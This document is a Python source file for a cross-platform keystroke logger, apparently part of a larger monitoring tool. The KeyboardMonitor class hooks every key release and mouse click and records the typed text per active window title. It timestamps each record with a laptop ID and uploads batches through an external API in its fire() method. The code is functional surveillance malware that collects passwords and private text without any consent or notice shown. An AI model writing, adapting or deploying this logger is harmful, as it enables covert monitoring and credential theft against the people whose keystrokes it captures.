import json
from datetime import datetime
import pytz
from pynput import keyboard, mouse
import os
import subprocess
import re
# if OS_NAME == 'Windows': # Windows, Linux, Darwin
try:
    import pygetwindow as gw
except:
    pass

class KeyboardMonitor:
    value = ""
    title = ""
    controller = keyboard.Controller()

    def __init__(self, api, os_name, laptop_id=1):
        self.os_name = os_name
        self.api = api
        self.laptop_id = laptop_id
        self.payload = []

        print (self.getCurrentWindow())

    def getCurrentWindow(self):
        #### Linux
        # sudo apt install xdotool
        # xdotool getactivewindow getwindowname
        if self.os_name == 'Windows':
            try:
                return gw.getActiveWindowTitle().strip()
            except:
                return ""
        elif self.os_name == 'Linux':
            result = subprocess.run(['xdotool', 'getactivewindow', 'getwindowname'], stdout=subprocess.PIPE)
            return result.stdout.decode().strip()
        else:
            from AppKit import NSWorkspace
            from Quartz import (
                CGWindowListCopyWindowInfo,
                kCGWindowListOptionOnScreenOnly,
                kCGNullWindowID
            )
            curr_app = NSWorkspace.sharedWorkspace().frontmostApplication()
            curr_pid = NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationProcessIdentifier']
            curr_app_name = curr_app.localizedName()
            options = kCGWindowListOptionOnScreenOnly
            windowList = CGWindowListCopyWindowInfo(options, kCGNullWindowID)
            for window in windowList:
                pid = window['kCGWindowOwnerPID']
                windowNumber = window['kCGWindowNumber']
                ownerName = window['kCGWindowOwnerName']
                geometry = window['kCGWindowBounds']
                windowTitle = window.get('kCGWindowName', u'Unknown')
                if curr_pid == pid:
                    return windowTitle.encode('ascii','ignore').decode()
            return ""

    def add_record(self, content, app_title):
        if content:
            content = re.sub("[\t ]{2,}", " ", self.value.strip())

        if content and len(content) > 5:
            self.payload.append({
                "content": content,
                "app_title": app_title,
                "laptop_id": self.laptop_id,
                "captured_at": datetime.now().astimezone(pytz.utc).isoformat()
            })

    def listen(self):
        # Collect events until released
        with keyboard.Listener(on_release=self.on_press) as kl, \
                mouse.Listener(on_click=self.on_click) as ml:
            kl.join()
            ml.join()

    def on_click(self, x, y, button, pressed):
        if pressed:
            title = self.getCurrentWindow()
            if self.title == title:
                self.value += " "
            else:
                self.add_record(self.value, self.title)
                self.value = ""
                self.title = title

    def on_press(self, key):
        try:
            if key == keyboard.Key.esc:
                pass
            elif key == keyboard.Key.space:
                self.value += " "
            elif key == keyboard.Key.backspace:
                self.value = self.value[:-1]
            elif key == keyboard.Key.enter:
                self.value += " "
            elif key == keyboard.Key.tab:
                title = self.getCurrentWindow()

                if title == "" or self.title == title:
                    self.value += "\t"
                else:
                    self.add_record(self.value, self.title)
                    self.value = ""
                    self.title = title
            else:
                self.value += key.char

                if self.title == "":
                    self.title = self.getCurrentWindow()
        except:
            pass
            # print('special key {0} pressed'.format(
            #     key))

    def fire(self):
        self.add_record(self.value, self.title)
        print (self.payload, '>>>>>>>')
        if len(self.payload) > 0:
            print (self.api.upload_keyboard(json.dumps(self.payload)))

        self.value = ""
        self.title = ""
        self.payload = []
        # self.controller.press(keyboard.Key.esc)
        # self.controller.release(keyboard.Key.esc)

    # def on_release(self, key):
    #     # print('{0} released'.format(
    #     #     key))
    #     if key == keyboard.Key.esc:
    #         # print ("result: %s": )
    #         # Stop listener
    #         return False
